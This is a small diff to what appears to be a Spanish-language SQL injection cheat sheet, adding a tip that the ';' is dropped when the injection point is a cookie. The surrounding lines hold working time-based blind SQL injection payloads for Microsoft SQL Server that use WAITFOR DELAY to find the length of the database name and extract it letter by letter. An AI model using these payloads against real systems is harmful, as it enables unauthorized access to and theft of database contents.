@@ -17,6 +17,7 @@ Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada analizan
     <dato>'; IF (LEN(db_name()))=<num> WAITFOR DELAY '0:0:10'-- 
 
 ### Extraer el nombre de una DB
+Si es en cookie, quitar el ";"
 
     <dato>'; IF (select substring(db_name(),<index>,1))='<letra>' WAITFOR DELAY '0:0:10'-- 
 
